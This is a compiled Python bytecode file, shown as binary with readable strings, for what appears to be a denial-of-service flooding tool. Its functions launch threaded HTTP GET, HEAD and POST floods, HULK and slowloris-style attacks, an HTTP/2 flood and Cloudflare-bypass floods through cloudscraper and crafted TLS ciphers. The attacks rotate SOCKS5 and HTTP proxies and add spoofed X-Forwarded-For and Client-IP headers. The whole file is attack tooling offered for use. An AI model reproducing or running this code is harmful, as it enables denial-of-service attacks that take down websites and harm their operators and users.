Hs   �9C �Cc                 �   � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }t	          t          |�  �        �  �        D ]}	 t          d|z   dz   �  �         �#  Y �xY wd S )Nr   zthreading.Thread(target=Attackz, args=(url, until)).start())r   r   r   r   r\   �exec)r2   r�   r   �methodr   rh   s         r   �Launchr�   ]  s�   � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E��3�r�7�7�^�^� � ��	��1�&�8�9W�W�X�X�X�X��	��D����	� s   �!A7�7A;c                 �8  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }t	          t          |�  �        �  �        D ];}	 t          j        t          | |f��  �        }|�                    �   �          �5#  Y �9xY wd S r�   )	r   r   r   r   r\   r~   r   �
AttackHEADr�   �r2   r�   r   r   rh   r�   s         r   �
LaunchHEADr�   f  �   � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E��3�r�7�7�^�^� � ��	��"�*�C��<�H�H�H�C��I�I�K�K�K�K��	��D����� �   �!1B�Bc                 �H  � |t           j         �                    �   �         z
  �                    �   �         dk    rj	 t          j        | �  �         t          j        | �  �         n#  Y nxY w|t           j         �                    �   �         z
  �                    �   �         dk    �hd S d S �Nr   )r   r   r   r-   �head�r2   r�   s     r   r�   r�   o  �   � ��H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�	��M�#�����M�#������	��D���� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
H�   �(A" �"A&c                 �8  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }t	          t          |�  �        �  �        D ];}	 t          j        t          | |f��  �        }|�                    �   �          �5#  Y �9xY wd S r�   )	r   r   r   r   r\   r~   r   �
AttackPOSTr�   r�   s         r   �
LaunchPOSTr�   y  r�   r�   c                 �H  � |t           j         �                    �   �         z
  �                    �   �         dk    rj	 t          j        | �  �         t          j        | �  �         n#  Y nxY w|t           j         �                    �   �         z
  �                    �   �         dk    �hd S d S r�   )r   r   r   r-   �postr�   s     r   r�   r�   �  r�   r�   c                 �8  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }t	          t          |�  �        �  �        D ];}	 t          j        t          | |f��  �        }|�                    �   �          �5#  Y �9xY wd S r�   )	r   r   r   r   r\   r~   r   �	AttackRAWr�   r�   s         r   �	LaunchRAWr�   �  s�   � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E��3�r�7�7�^�^� � ��	��"�)�3��,�G�G�G�C��I�I�K�K�K�K��	��D����� r�   c                 �H  � |t           j         �                    �   �         z
  �                    �   �         dk    rj	 t          j        | �  �         t          j        | �  �         n#  Y nxY w|t           j         �                    �   �         z
  �                    �   �         dk    �hd S d S r�   )r   r   r   r-   r.   r�   s     r   r�   r�   �  s�   � ��H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�	��L������L�������	��D���� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
Hr�   c                 �8  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }t	          t          |�  �        �  �        D ];}	 t          j        t          | |f��  �        }|�                    �   �          �5#  Y �9xY wd S r�   )	r   r   r   r   r\   r~   r   �AttackPXRAWr�   r�   s         r   �LaunchPXRAWr�   �  s�   � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E��3�r�7�7�^�^� � ��	��"�+�S�%�L�I�I�I�C��I�I�K�K�K�K��	��D����� r�   c                 ��  � |t           j         �                    �   �         z
  �                    �   �         dk    r�dt          t	          j        t          t          �  �        �  �        �  �        z   }||d�}	 t          j	        | |��  �         t          j	        | |��  �         n#  Y nxY w|t           j         �                    �   �         z
  �                    �   �         dk    ��d S d S )Nr   �http://)�httpr=   )rM   )
r   r   r   r   r|   �choice�listrM   r-   r.   )r2   r�   �proxys      r   r�   r�   �  s�   � ��H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H��#�f�m�D��M�M�:�:�;�;�;����
� 
��	��L��e�,�,�,�,��L��e�,�,�,�,�,��	��D���� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
Hs   �4,B! �!B%c                 �$  � t          | �  �        }t          j        �                    �   �         t          j        t	          |�  �        ��  �        z   }t          j        t          �  �        }t          j        t          �  �        }|| z   |d         z   dz   }|d|d         z   dz   z  }||dz   z  }|dz  }|dz  }t          t	          |�  �        �  �        D ]<}	 t          j        t          |||f�	�  �        }	|	�                    �   �          �6#  Y �:xY wd S )
Nr   r5   � HTTP/1.1
�Host: r8   �
��Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
'�Connection: Keep-Alive

rz   )rE   r   r   r   r   r|   r�   r�   �
useragentsr\   r~   r   �AttackPXSOCr�   �
r2   r�   r   rD   r   �m�
user_agent�reqrh   r�   s
             r   �LaunchPXSOCr�   �  s  � ���_�_�F���!�!�#�#�h�&8��Q���&H�&H�&H�H�E���f���A���z�*�*�J��s�7�6�%�=� �?�2�C��8�f�V�n�$�v�-�-�C��:�v���C��  b�  b�C��+�+�C��3�r�7�7�^�^� � ��	��"�+�V�U�C�<P�Q�Q�Q�C��I�I�K�K�K�K��	��D����� s   �2D	�	Dc                 �  � |t           j         �                    �   �         z
  �                    �   �         dk    �r�	 t          j        t          t          �  �        �  �        �                    d�  �        }| d         dk    r�t          j	        �   �         }|�
                    t          j        t          j        d�  �         |�                    t          j        t!          |d         �  �        t#          |d         �  �        �  �         |�                    t!          | d         �  �        t#          | d         �  �        f�  �         t'          j        �   �         �                    || d         ��  �        }n�t          j	        �   �         }|�
                    t          j        t          j        d�  �         |�                    t          j        t!          |d         �  �        t#          |d         �  �        �  �         |�                    t!          | d         �  �        t#          | d         �  �        f�  �         	 t-          d	�  �        D ]/}|�                    t           �                    |�  �        �  �         �0n#  |�                    �   �          Y nxY wn#  Y d S xY w|t           j         �                    �   �         z
  �                    �   �         dk    ���d S d S )
Nr   r:   r9   r=   r;   r8   r<   ��server_hostname�d   )r   r   r   r|   r�   r�   rM   rC   �socks�
socksocketr�   r�   �IPPROTO_TCP�TCP_NODELAY�	set_proxy�HTTPr   r   r�   �ssl�create_default_context�wrap_socketr\   �send�encoder0   )rD   r�   r�   r�   �srh   s         r   r�   r�   �  s;  � ��H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�	��M�$�w�-�-�0�0�6�6�s�;�;�E��h��7�*�*��$�&�&�����V�/��1C�Q�G�G�G����E�J��E�!�H���s�5��8�}�}�E�E�E��	�	�3�v�f�~�.�.��F�6�N�0C�0C�D�E�E�E��.�0�0�<�<�Q�PV�W]�P^�<�_�_����$�&�&�����V�/��1C�Q�G�G�G����E�J��E�!�H���s�5��8�}�}�E�E�E��	�	�3�v�f�~�.�.��F�6�N�0C�0C�D�E�E�E���s��� ,� ,�A��F�F�3�:�:�c�?�?�+�+�+�+�,������	�	�	�	�	������	��F�F����) �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
Hs$   �G8J �3?I3 �2J �3J�	J �Jc                 �  � t          | �  �        }t          j        �                    �   �         t          j        t	          |�  �        ��  �        z   }t          j        t          �  �        }t          j        t          �  �        }|| z   |d         z   dz   |d         z   dz   }||dz   z  }|dz  }|dz  }t          t	          |�  �        �  �        D ]<}	 t          j        t          |||f��  �        }	|	�                    �   �          �6#  Y �:xY wd S )	Nr   r5   � HTTP/1.1
Host: r8   r�   r�   r�   rz   )rE   r   r   r   r   r|   r�   r�   r�   r\   r~   r   �	AttackSOCr�   r�   s
             r   �	LaunchSOCr�   �  s  � ���_�_�F���!�!�#�#�h�&8��Q���&H�&H�&H�H�E���f���A���z�*�*�J��s�7�6�%�=� �!6�6����G�&�P�C��:�v���C��  b�  b�C��+�+�C��3�r�7�7�^�^� � ��	��"�)�6�5�#�:N�O�O�O�C��I�I�K�K�K�K��	��D����� s   �2D�Dc                 �  � | d         dk    r�t          j        �   �         }|�                    t          j        t          j        d�  �         |�                    t          | d         �  �        t          | d         �  �        f�  �         t          j
        �   �         �                    || d         ��  �        }n{t          j        �   �         }|�                    t          j        t          j        d�  �         |�                    t          | d         �  �        t          | d         �  �        f�  �         |t          j        �                    �   �         z
  �                    �   �         dk    r�	 	 t          d�  �        D ]/}|�                    t          �                    |�  �        �  �         �0n#  |�                    �   �          Y nxY wn#  Y nxY w|t          j        �                    �   �         z
  �                    �   �         dk    ��d S d S )	Nr9   r=   r;   r8   r<   r�   r   r�   �r�   r�   r�   r�   r�   r�   r�   r   r   r�   r�   r�   r   r   r   r\   r�   r�   r0   )rD   r�   r�   r�   rh   s        r   r�   r�   �  s�  � ��h��7�"�"������	���V�'��);�Q�?�?�?�	�	�	�3�v�f�~�&�&��F�6�N�(;�(;�<�=�=�=��&�(�(�4�4�Q��v��4�W�W��������	���V�'��);�Q�?�?�?�	�	�	�3�v�f�~�&�&��F�6�N�(;�(;�<�=�=�=��H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�	���s��� ,� ,�A��F�F�3�:�:�c�?�?�+�+�+�+�,������	�	�	�	�	������	��D���� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
Hs   �+?F+ �*G �+G�G �Gc                 ��  � t          | �  �        }t          j        t          �  �        }t          j        �                    �   �         t	          j        t          |�  �        ��  �        z   }t          j        t          �  �        }t          j        t          �  �        }|| z   |d         z   dz   t          t          j
        dd�  �        �  �        z   dz   t          t          j
        dd�  �        �  �        z   dz   |d         z   d	z   }||d	z   z  }|d
z  }|dz  }t          t          |�  �        �  �        D ]<}	 t          j        t          |||f��  �        }	|	�                    �   �          �6#  Y �:xY wd S )Nr   r5   �?r;   ��  rU   r�   r8   r�   r�   z3Connection: Keep-Alive
Cache-Control: no-cache

rz   )rE   r|   r�   r�   r   r   r   r   r�   r   r�   r\   r~   r   �
AttackHULKr�   )
r2   r�   r   rD   r�   r   r�   r�   rh   r�   s
             r   �
LaunchHULKr�     ss  � ���_�_�F���z�*�*�J���!�!�#�#�h�&8��Q���&H�&H�&H�H�E���f���A���z�*�*�J��s�7�6�%�=� ��$�c�&�.��4�*@�*@�&A�&A�A�#�E�c�&�.�YZ�[_�J`�J`�Fa�Fa�a�bw�w�  {A�  BH�  {I�  I�  LR�  R�C��:�v���C��  b�  b�C��F�F�C��3�r�7�7�^�^� � ��	��"�*�F�E�3�;O�P�P�P�C��I�I�K�K�K�K��	��D����� s   �62E)�)E-c                 ��  � | d         dk    r�t          j        �   �         }|�                    t          j        t          j        d�  �         |�                    t          | d         �  �        t          | d         �  �        f�  �         t          j
        �   �         �                    || d         ��  �        }n�t          j        �   �         }|�                    t          j        t          j        d�  �         |�                    t          | d         �  �        t          | d         �  �        f�  �         t          j
        �   �         }dg}|�                    |�  �         |�                    |t          t          �  �        j        ��  �        }|t           j        �                    �   �         z
  �                    �   �         dk    r�	 	 t'          d	�  �        D ]/}|�                    t          �                    |�  �        �  �         �0n#  |�                    �   �          Y nxY wn#  Y nxY w|t           j        �                    �   �         z
  �                    �   �         dk    ��d S d S )
Nr9   r=   r;   r8   r<   r�   �  :ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSKr   r�   )r�   r�   r�   r�   r�   r�   r�   r   r   r�   r�   r�   �set_ciphersr   r2   rB   r   r   r   r\   r�   r�   r0   )rD   r�   r�   r�   �ctx�cipherrh   s          r   r�   r�     s  � ��h��7�"�"������	���V�'��);�Q�?�?�?�	�	�	�3�v�f�~�&�&��F�6�N�(;�(;�<�=�=�=��&�(�(�4�4�Q��v��4�W�W��������	���V�'��);�Q�?�?�?�	�	�	�3�v�f�~�&�&��F�6�N�(;�(;�<�=�=�=��(�*�*�� p�  q����������O�O�A�x��}�}�/C�O�D�D���H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�	���s��� ,� ,�A��F�F�3�:�:�c�?�?�+�+�+�+�,������	�	�	�	�	������	��D���� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
Hs   �?H �H  �H�H  � H$c                 �`  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }t	          j        �   �         }t          t          |�  �        �  �        D ]<}	 t          j        t          | ||f��  �        }|�
                    �   �          �6#  Y �:xY wd S r�   )r   r   r   r   �cloudscraper�create_scraperr\   r~   r   �	AttackCFBr�   )r2   r�   r   r   �scraperrh   r�   s          r   �	LaunchCFBr   .  s�   � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E��)�+�+�G��3�r�7�7�^�^� � ��	��"�)�3��w�:O�P�P�P�C��I�I�K�K�K�K��	��D����� s   �42B'�'B+c                 �  � |t           j         �                    �   �         z
  �                    �   �         dk    r�t          d�  �        D ]O}	 |�                    | d��  �         |�                    | d��  �         |�                    | d��  �         �I#  Y �MxY w|t           j         �                    �   �         z
  �                    �   �         dk    ��d S d S )Nr   r�   �   )�timeout)r   r   r   r\   r.   r�   r�   )r2   r�   r�   rh   s       r   r�   r�   8  s�   � ��H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H��C�j�j� � ��	��K�K��Q�K�'�'�'��L�L��a�L�(�(�(��L�L��a�L�(�(�(�(��	��D���� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
Hs   �
AB�Bc                 �   � t          t          |�  �        �  �        D ]1}t          j        t          | |f��  �        �                    �   �          �2d S �Nrz   )r\   r   r~   r   �LaunchPXCFBr�   �r2   �timer�threadsrk   s       r   �attackPXCFBr
  E  �V   � ��3�w�<�<� � � H� H�����3��,�?�?�?�E�E�G�G�G�G�H� Hr    c                 �n  � t          dd�  �        �                    �   �         �                    d�  �        }t          j        |�  �        �                    �   �         �                    d�  �        }t          j        �   �         t          |�  �        z   }t          j        t          �  �        }t          j        t          �  �        }|| z   dz   t          | �  �        j        z   dz   }|dz  }||dz   z  }|dz  }|d	z  }|d
z  }|dz  }|dz  }|dz  }|dz  }t          j        �   �         |k     �r		 t          j        �   �         }|�                    t          j        t!          |d         �  �        t          |d         �  �        �  �         |�                    t$          j        t$          j        d�  �         |�                    t!          t          | �  �        j        �  �        t          d�  �        f�  �         t-          j        �   �         }	dg}
|	�                    |
�  �         |	�                    |t          | �  �        j        ��  �        }|�                    t           �                    |�  �        �  �         	 t9          d�  �        D ]\}|�                    t           �                    |�  �        �  �         |�                    t           �                    |�  �        �  �         �]n#  |�                    �   �          Y nxY wn#  |�                    �   �          Y nxY wt          j        �   �         |k     ��d S d S )NrG   rH   rI   r:   z / HTTP/1.3
Host: r�   �Cache-Control: no-cache
r�   �Sec-Fetch-Site: same-origin
�Sec-GPC: 1
�Sec-Fetch-Mode: navigate
�Sec-Fetch-Dest: document
�Upgrade-Insecure-Requests: 1
r�   r   r;   �  r�   r�   ��   )r*   rL   rC   r|   r�   �striprc   r   r�   r�   r   rB   r�   r�   r�   r�   r   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r\   r0   )r2   r  �proxr�   �timelolr�   r�   r�   r�   r�   r�   rh   s               r   r  r  I  s�  � ���c�"�"�'�'�)�)�/�/��5�5�D��M�$���%�%�'�'�-�-�c�2�2�E��i�k�k�C��J�J�&�G���f���A���z�*�*�J��s�7�*�*�X�c�]�]�-A�A�F�J�C��(�(�C��:�v���C��  b�  b�C��,�,�C����C��)�)�C��)�)�C��-�-�C��+�+�C�
�)�+�+��
�
�	�� �"�"�A��K�K��
�C��a��M�M�3�u�Q�x�=�=�A�A�A��L�L��*�F�,?��C�C�C��I�I�s�8�C�=�=�/�0�0�#�c�(�(�;�<�<�<��,�.�.�C� t�  u�F��O�O�F�#�#�#�����8�C�=�=�3G��H�H�A��F�F�3�:�:�c�?�?�#�#�#���s��� ,� ,�A��F�F�3�:�:�c�?�?�+�+�+��F�F�3�:�:�c�?�?�+�+�+�+�,������	�	�	�	�	������	��G�G�I�I�I�I�I����% �)�+�+��
�
�
�
�
�
s&   �-E	L  �7A,K$ �#L  �$K<�:L  � Lc                 �  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }t	          j        �   �         }t          j        |��  �        }t          �   �         }|�	                    t          d         t          d         �  �         ||_        t          t          |�  �        �  �        D ]<}	 t          j        t          | ||f��  �        }|�                    �   �          �6#  Y �:xY wd S )Nr   )�sessr   rV   rz   )r   r   r   r   r-   �Sessionr�   r�   r   �setr^   ri   r\   r~   r   �AttackCFPROr�   )	r2   r�   r   r   �sessionr�   �jarrh   r�   s	            r   �LaunchCFPROr  n  s�   � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E��� � �G��)�w�7�7�7�G�
�
�
�C��G�G�I�f��y��1�2�2�2��G�O��3�r�7�7�^�^� � ��	��"�+�S�%��<Q�R�R�R�C��I�I�K�K�K�K��	��D����� s   �
2C=�=Dc                 �x  � dddddddddd	d
ddd�}|t           j         �                    �   �         z
  �                    �   �         dk    rr	 |�                    | |d��  �         |�                    | |d��  �         n#  Y nxY w|t           j         �                    �   �         z
  �                    �   �         dk    �pd S d S )N��Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9�#tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7�deflate, gzip;q=1.0, *;q=0.5�no-cache�
keep-alive�1�document�navigate�same-origin�?1�trailers)�
User-Agent�Accept�Accept-Language�Accept-Encoding�Cache-Control�Pragma�
Connection�Upgrade-Insecure-Requests�Sec-Fetch-Dest�Sec-Fetch-Mode�Sec-Fetch-Site�Sec-Fetch-User�TEr   F)r2   �headers�allow_redirects)r   r   r   r.   )r2   r�   r�   r:  s       r   r  r  |  s�   � � u� \�@�9�#��"�%(�$�$�'���� �G� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�	��K�K�C��%�K�H�H�H��K�K�C��%�K�H�H�H�H��	��D���� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
Hs   �	0A: �:A>c                 �D  � t           j         �                    �   �         t          j        t          |�  �        ��  �        z   }t	          | �  �        }d|d         z   dz   }|d|d         z   dz   z  }|dz  }|d	z  }|d
z  }|dz  }|dt
          z   dz   z  }|dz  }|dz  }|dz  }|dz  }|dz  }|dz  }|dz  }|dt          z   dz   z  }t          t          |�  �        �  �        D ]<}	 t          j	        t          |||f��  �        }|�                    �   �          �6#  Y �:xY wd S )Nr   zGET r5   r�   r�   r8   r�   z�Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
z$Accept-Encoding: gzip, deflate, br
z6Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7
zCache-Control: max-age=0
zCookie: z8sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"
zsec-ch-ua-mobile: ?0
zsec-ch-ua-platform: "Windows"
zsec-fetch-dest: empty
zsec-fetch-mode: cors
zsec-fetch-site: same-origin
zConnection: Keep-Alive
zUser-Agent: z


rz   )r   r   r   r   rE   ra   r`   r\   r~   r   �AttackCFSOCr�   )r2   r�   r   r   rD   r�   rh   r�   s           r   �LaunchCFSOCr>  �  so  � ���!�!�#�#�h�&8��Q���&H�&H�&H�H�E���_�_�F��6�%�=� �/�1�C��8�f�V�n�$�v�-�-�C��  a�  a�C��3�3�C��E�E�C��)�)�C��:����'�'�C��H�H�C��%�%�C��.�.�C��&�&�C��%�%�C��,�,�C��'�'�C��>�I�%��6�6�C��3�r�7�7�^�^� � ��	��"�+�E�6�3�;P�Q�Q�Q�C��I�I�K�K�K�K��	��D����� s   �&2D�Dc                 �   � |d         dk    r�t          j        �   �         }|�                    t          j        t          j        d�  �         |�                    t          |d         �  �        t          |d         �  �        f�  �         t          j
        �   �         �                    ||d         ��  �        }n{t          j        �   �         }|�                    t          j        t          j        d�  �         |�                    t          |d         �  �        t          |d         �  �        f�  �         | t          j        �                    �   �         z
  �                    �   �         dk    r�	 t          d�  �        D ]/}|�                    t          �                    |�  �        �  �         �0n#  |�                    �   �          Y nxY w| t          j        �                    �   �         z
  �                    �   �         dk    ��d S d S )	Nr9   r=   r;   r8   r<   r�   r   �
   r�   )r�   rD   r�   �packetrh   s        r   r=  r=  �  s�  � ��h��7�"�"��!�#�#�����&�,�f�.@�!�D�D�D�����F�6�N�+�+�S����-@�-@�A�B�B�B��+�-�-�9�9�&�RX�Y_�R`�9�a�a����!�#�#�����&�,�f�.@�!�D�D�D�����F�6�N�+�+�S����-@�-@�A�B�B�B��H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�	��2�Y�Y� -� -�����C�J�J�s�O�O�,�,�,�,�-��	��L�L�N�N�N��D���� �H�-�1�1�3�3�3�
B�
B�
D�
D�q�
H�
H�
H�
H�
H�
Hs   �*?F* �*Gc                 �   � t          t          |�  �        �  �        D ]1}t          j        t          | |f��  �        �                    �   �          �2d S r  )r\   r   r~   r   �
Launchslowr�   r  s       r   �
attackslowrD  �  sV   � ��3�w�<�<� � � G� G����
�#�u��>�>�>�D�D�F�F�F�F�G� Gr    c                 �  � t          �   �          t          dd�  �        �                    �   �         �                    d�  �        }t	          j        |�  �        �                    �   �         �                    d�  �        }t          j        �   �         t          |�  �        z   }t	          j        t          �  �        }t	          j        t          �  �        }|| z   dz   t          | �  �        j        z   dz   }|dz  }||dz   z  }|dz  }|d	z  }|d
z  }|dz  }|dz  }|dz  }|dz  }t          j        �   �         |k     �r�	 t          j        �   �         }|�                    t!          t          | �  �        j        �  �        t          d�  �        f�  �         |�                    t          j        t!          |d         �  �        t          |d         �  �        �  �         t'          j        t&          j        �  �        }	|	�                    |t          | �  �        j        ��  �        }|�                    d�                    t	          j        dd�  �        �  �        �                    d�  �        �  �         |�                    d�                    t	          j        t          �  �        �  �        �                    d�  �        �  �         |�                    d�                    d�  �        �                    d�  �        �  �         |�                    d�                    d�  �        �  �         	 t          j        d�  �         |�                    d�                    t	          j        dd�  �        �  �        �                    d�  �        �  �         �c#  |�                    �   �          t;          �   �          Y nxY wt          j        �   �         |k     ���d S d S )N�./socks5.txtrH   rI   r:   � / HTTP/1.1
Host: r�   r  r�   r  r  r  r  r  r�   r  r   r;   r�   zGET /?{} HTTP/1.1
i�  zutf-8zUser-Agent: {}
z{}
zAccept-language: en-US,en,q=0.5zConnection:keep-aliveT�   z	X-a: {}
i�  )r3   r*   rL   rC   r|   r�   r  rc   r   r�   r�   r   rB   r�   r�   r�   r   r�   �SOCKS5r�   �
SSLContext�PROTOCOL_TLSv1_2r�   r�   �formatr�   r�   rd   r0   rC  )
r2   r  r  r�   r  r�   r�   r�   r�   r�   s
             r   rC  rC  �  s'  � ��N�N�N����$�$�)�)�+�+�1�1�$�7�7�D��M�$���%�%�'�'�-�-�c�2�2�E��i�k�k�C��J�J�&�G���f���A���z�*�*�J��s�7�*�*�X�c�]�]�-A�A�F�J�C��(�(�C��:�v���C��  b�  b�C��,�,�C����C��)�)�C��)�)�C��-�-�C��+�+�C�
�)�+�+��
�
�	�� �"�"�A��I�I�s�8�C�=�=�/�0�0�#�c�(�(�;�<�<�<��K�K���c�%��(�m�m�S��q��]�]�C�C�C��.��!5�6�6�C�����8�C�=�=�3G��H�H�A��F�F�*�1�1�&�.��D�2I�2I�J�J�Q�Q�RY�Z�Z�[�[�[��F�F�'�.�.�v�}�Z�/H�/H�I�I�P�P�QX�Y�Y�Z�Z�Z��F�F�8�?�?�#D�E�E�L�L�W�U�U�V�V�V��F�F�+�3�3�G�<�<�=�=�=�V��
�2�������}�+�+�F�N�1�d�,C�,C�D�D�K�K�G�T�T�U�U�U�V��	��G�G�I�I�I��L�L�L�L�L����! �)�+�+��
�
�
�
�
�
s   �;IN �$N,c                 �   � t          t          |�  �        �  �        D ]1}t          j        t          | |f��  �        �                    �   �          �2d S r  )r\   r   r~   r   �Launchhttp2r�   r  s       r   �attackhttp2rO  �  r  r    c                 �t  � t          j         �   �         t          |�  �        z   }t          j         �   �         |k     �r|dddddddddd	d
dd�}d}t          t          d� t	          |�  �        �  �        �  �        }t          j        dd�  �        }t          j        |�  �        }dd|z   i}t          �	                    d d d��  �        }	t          �
                    dt          j        |�  �        ||	d dd��  �        5 }
	 	 t          d�  �        D ]^}|
�                    | �  �        }|
�                    | d|i��  �        }|
�                    | d|i��  �        }|
�                    | �  �        }�_�o# t          j        $ r
}Y d }~nd }~ww xY w	 d d d �  �         n# 1 swxY w Y   t          j         �   �         |k     ��zd S d S )Nr!  r"  r#  r$  r%  r&  r'  r(  r)  r*  r+  )r-  r.  r/  r0  r1  r2  r3  r4  r5  r6  r7  r8  zhttp.txtc                 �*   � | �                     �   �         S )N)r  )�xs    r   �<lambda>zLaunchhttp2.<locals>.<lambda>  s   � �a�g�g�i�i� r    i  i/� r�   rS   )�max_keepalive_connections�max_connections�keepalive_expiryTF)�http2rM   r:  �limitsr  �verify�follow_redirectsi�  �login)�data)rc   r   r�   �mapr*   r|   r�   r�   �httpx�Limits�Clientr\   r.   r�   �putr�   �	HTTPError)r2   r  r  r:  �	proxfile1�prox1rV   �proxy1rM   rX  �clientrh   �r1�r2�r3�r5�excs                    r   rN  rN  �  s   � ��)�+�+��E�
�
�*���i�k�k�G�#�#� y� `�D�=�'� �&�),�(�(�+�"�� �G� #�I���/�/��Y���@�@�A�A�E��N�5�&�1�1�E��]�5�)�)�F� �)�E�/�2�G��\�\�D�RV�ik�\�l�l�F����D���w�1G�1G�PW�`f�pt� �%� � 9� 9� 
�<B��2�!&�s��� 2� 2�A�!'���C���B�!'���S���7G��!H�!H�B�!'���C�w��6F��!G�!G�B�!'���S�!1�!1�B�B�2�� �� � � ��4�4�4�4����������
� 
� 
� 
� 
� 
� 
� 
� 
� 
� 
���� 
� 
� 
� 
�/ �i�k�k�G�#�#�#�#�#�#s1   �8F�:A0E*�*F�9F�>F�F�F�Fc                  �  � g d�} d}t          t          j        dd�  �        �  �        | d<   t          t          j        dd�  �        �  �        | d<   t          t          j        dd�  �        �  �        | d<   t          t          j        dd	�  �        �  �        | d
<   | d         |z   | d         z   |z   | d         z   |z   | d
         z   }|S )N)��   �   r   r;   �.�   ��   r   ��   r;   �   ��   rR   )r   r|   �	randrange)�addr�d�
assemebleds      r   �spooferry    s�   � ����D��A��&�"�2�s�+�+�,�,�D��G��&�"�1�c�*�*�+�+�D��G��&�"�1�c�*�*�+�+�D��G��&�"�1�c�*�*�+�+�D��G��a��1��t�A�w�&��*�T�!�W�4�q�8�4��7�B�J��r    c                 �   � t          t          |�  �        �  �        D ]1}t          j        t          | |f��  �        �                    �   �          �2d S r  )r\   r   r~   r   �Launchspoofr�   r  s       r   �attackspoofr|  !  r  r    c                 ��  � t          �   �          t          dd�  �        �                    �   �         �                    d�  �        }t	          j        |�  �        �                    �   �         �                    d�  �        }t          j        �   �         t          |�  �        z   }t	          j        t          �  �        }t	          j        t          �  �        }|| z   dz   t          | �  �        j        z   dz   }||dz   z  }|dz  }|dz  }|d	t          | �  �        j        z   d
z   z  }|dt          �   �         z   dz   z  }|dt          �   �         z   dz   z  }|dt          �   �         z   dz   z  }|dt          �   �         z   dz   z  }|dz  }t          j        �   �         |k     �r�	 t          j        �   �         }|�                    t#          t          | �  �        j        �  �        t          d�  �        f�  �         |�                    t          j        t#          |d         �  �        t          |d         �  �        �  �         t)          j        t(          j        �  �        }	|	�                    |t          | �  �        j        ��  �        }|�                    t"          �                    |�  �        �  �         	 t5          d�  �        D ]\}
|�                    t"          �                    |�  �        �  �         |�                    t"          �                    |�  �        �  �         �]n#  |�                    �   �          Y nxY wn#  |�                    �   �          Y nxY wt          j        �   �         |k     ���d S d S )NrF  rH   rI   r:   rG  r�   r�   zX-Forwarded-Proto: Http
zX-Forwarded-Host: z, 1.1.1.1
zVia: zClient-IP: zX-Forwarded-For: z	Real-IP: r�   r  r   r;   r�   r  )r3   r*   rL   rC   r|   r�   r  rc   r   r�   r�   r   rB   ry  r�   r�   r�   r   r�   rI  r�   rJ  rK  r�   r�   r�   r\   r0   �r2   r  r  r�   r  r�   r�   r�   r�   r�   rk   s              r   r{  r{  %  s�  � ��N�N�N����$�$�)�)�+�+�1�1�$�7�7�D��M�$���%�%�'�'�-�-�c�2�2�E��i�k�k�C��J�J�&�G���f���A���z�*�*�J��s�7�*�*�X�c�]�]�-A�A�F�J�C��:�v���C��  b�  b�C��(�(�C������� 4�4�_�D�D�C��7�7�9�9��V�#�#�C��=����"�6�)�)�C���w�y�y�(��/�/�C��;�w�y�y� ��'�'�C��+�+�C�
�)�+�+��
�
